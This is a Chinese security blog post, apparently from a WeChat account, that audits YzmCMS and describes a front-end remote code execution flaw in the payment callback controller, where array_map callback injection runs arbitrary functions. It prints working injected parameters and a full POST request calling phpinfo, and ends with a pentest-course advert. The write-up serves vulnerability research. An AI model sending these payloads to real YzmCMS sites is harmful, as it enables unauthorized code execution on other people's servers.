#  代码审计 yzmcms远程任意命令执行漏洞  
原创 moonsec
                    moonsec  moonsec   2026-04-20 02:09  
  
```
免责声明：本公众号所提供的文字和信息仅供学习和研究使用，不得用于任何非法用途。
我们强烈谴责任何非法活动，并严格遵守法律法规。
读者应该自觉遵守法律法规，不得利用本公众号所提供的信息从事任何违法活动。
本公众号不对读者的任何违法行为承担任何责任。
```  
  
一、概述  
  
YzmCMS（以下简称本产品）采用面向对象方式自主研发的YZMPHP框架开发，它是一款开源高效的内容管理系统，产品基于PHP+Mysql架构，可运行在Linux、Windows、MacOSX、Solaris等各种平台上。  
  
  
二、代码审计   
  
路由访问方式  index.php?m=模块名&c=控制器名&a=方法名  
  
前台任意代码执行漏洞   
  
![](https://mmbiz.qpic.cn/mmbiz_png/0ic45F94NibRsr08S1MxGldKkeJrA3E1l78BKMjHN4w0RjKhvjZmicePibwbNLiags7kbeEianRuJpibAoqqamFiaUzEUJNNNkVuVoBibUeDn0mhH5tE/640?wx_fmt=png&from=appmsg "")  
  
直接走到代码执行的地方  array_map是执行一个回调函数 刚好phpinfo字符串传入 所以 array_map("phpinfo",2) 会执行phpinfo函数   
  
![](https://mmbiz.qpic.cn/mmbiz_png/0ic45F94NibRttZX7q7EcvzrRkpOA5HIWTInKzITW5LnoKR3Rdzk5N6fNaVJPaDpZr20ZY89oNn1ib9yNADATNmjwGHgoL4pF51W9IyfjGicg5w/640?wx_fmt=png&from=appmsg "")  
  
如果传入catid[]=eq&catid[][]=calc&catid[]=exec  
就会弹出计算器  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0ic45F94NibRuolZQx68ZiaAq4NuzJbSv69OEQBibCr231hlD86wNb3eQvGmdQoH3Dk2pbTQUAuCRSRCSjETSzk9Q7VvwNHKj9t9KbPgMibntDRw/640?wx_fmt=png&from=appmsg "")  
  
怎么利用？搜索->where() 直接传入参数即可  
  
漏洞位置 application/pay/controller/index.class.php  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0ic45F94NibRshX8ECNxfFcIT1lS7qVFvZArzK6IAsEz1ficoYqxdPR5ib9S0GyGYGrC7xvdGeHa0VqnE3YPElBFZMNyTF3pTolRXeqjco2ECGw/640?wx_fmt=png&from=appmsg "")  
  
复现漏洞  
```
POST /pay/index/pay_callback.html HTTP/1.1Host: www.d26.comAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Content-Type: application/x-www-form-urlencodedout_trade_no[]=eq&out_trade_no[][]=1&out_trade_no[]=phpinfo
```  
  
执行phpinfo返回信息  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0ic45F94NibRvtKyoicy1VOcRMCucScgx6MVBicibZyNcUHZOm1PtMibt5BynHAiaicHLttoJK4ibeF2Fugevsd6Cfv4icVesCM022pWaRIsXjUxyxY1E/640?wx_fmt=png&from=appmsg "")  
  
  
关注公众号回复【  
20260420】下载本源码  
  
想系统学习渗透测试？扫码报名培训课程！  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/0ic45F94NibRuw8pG86KHrruYsUUypiaMZpWz7kl2yJB68vlbCzVC9PdJUQThMFoqCNawVB7TDNCRPruKXjvNPS0qXbDpzf8A6T508TNxLFHib0/640?wx_fmt=jpeg&from=appmsg "")  
  
  
